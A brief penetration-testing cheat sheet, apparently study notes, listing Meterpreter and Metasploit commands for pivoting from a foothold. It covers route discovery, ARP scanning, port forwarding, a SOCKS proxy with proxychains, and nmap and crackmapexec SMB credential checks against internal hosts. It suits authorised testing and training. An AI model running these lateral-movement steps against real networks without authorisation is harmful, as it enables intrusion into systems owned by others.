# Pivoting (Meterpreter & Friends)

## Discover internal networks from foothold

run autoroute -s <TARGET1_SUBNET/CIDR>
run autoroute -p     # show routes
run arp_scanner -r <TARGET1_SUBNET/CIDR>
Port Forwarding (Meterpreter)

# Forward local <LOCAL_PORT> to <TARGET2_IP>:<TARGET2_PORT> via session
portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
# Scan the forwarded service locally
db_nmap -sS -sV -p <LOCAL_PORT> localhost
SOCKS Proxy (Metasploit)

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
run
# /etc/proxychains4.conf: add "socks5 127.0.0.1 9050"
Proxychains examples

proxychains nmap -sT -Pn -p80,445 <INTERNAL_HOST>
proxychains crackmapexec smb <INTERNAL_HOST> -u <USER> -p <PW>
